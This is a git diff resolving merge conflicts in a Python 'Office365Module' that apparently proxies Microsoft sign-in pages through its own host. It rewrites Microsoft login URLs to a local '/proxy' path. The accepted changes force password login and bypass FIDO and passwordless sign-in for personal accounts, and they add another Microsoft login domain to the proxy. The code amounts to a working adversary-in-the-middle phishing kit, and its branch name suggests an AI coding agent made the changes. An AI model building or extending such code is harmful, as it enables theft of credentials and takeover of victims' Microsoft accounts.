@@ -519,14 +519,9 @@ class Office365Module(BaseModule):
                     is_personal = any(domain in self.user.lower() for domain in personal_domains)
                     
                     if is_personal:
-<<<<<<< HEAD
-                        # Use consumer/personal account endpoint – basic login flow instead of OAuth to avoid invalid redirect_uri errors
-                        microsoft_url = f"https://login.live.com/login.srf?username={self.user}"
-=======
                         # Use consumer/personal account endpoint with password-first flow
                         # Force password authentication and skip FIDO/passwordless
                         microsoft_url = f"https://login.live.com/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&amtcb=1&forcepassword=1"
->>>>>>> cursor/resolve-aadsts500200-personal-account-error-03fe
                     else:
                         # Use organizational account endpoint
                         microsoft_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
@@ -556,26 +551,17 @@ class Office365Module(BaseModule):
             # Build the target Microsoft URL with the given path
             query_string = request.query_string.decode('utf-8')
             
-<<<<<<< HEAD
-            # Determine target domain based on user type
-=======
             # Determine target domain based on user type and path
->>>>>>> cursor/resolve-aadsts500200-personal-account-error-03fe
             if hasattr(self, 'user') and self.user:
                 personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                 is_personal = any(domain in self.user.lower() for domain in personal_domains)
                 
                 if is_personal:
-<<<<<<< HEAD
-                    # For personal accounts, use login.live.com
-                    target_url = f"https://login.live.com/{path}"
-=======
                     # For personal accounts, route to appropriate Microsoft consumer domain
                     if 'consumers' in path or 'fido' in path:
                         target_url = f"https://login.microsoft.com/{path}"
                     else:
                         target_url = f"https://login.live.com/{path}"
->>>>>>> cursor/resolve-aadsts500200-personal-account-error-03fe
                 else:
                     # For organizational accounts, use login.microsoftonline.com
                     target_url = f"https://login.microsoftonline.com/{path}"
@@ -707,11 +693,8 @@ class Office365Module(BaseModule):
                         ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
                         ('"https://login.live.com', f'"https://{current_host}/proxy'),
                         ("'https://login.live.com", f"'https://{current_host}/proxy"),
-<<<<<<< HEAD
-=======
                         ('"https://login.microsoft.com', f'"https://{current_host}/proxy'),
                         ("'https://login.microsoft.com", f"'https://{current_host}/proxy"),
->>>>>>> cursor/resolve-aadsts500200-personal-account-error-03fe
                         ('https://account.live.com/', f'https://{current_host}/proxy/'),
                         ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
                     ]
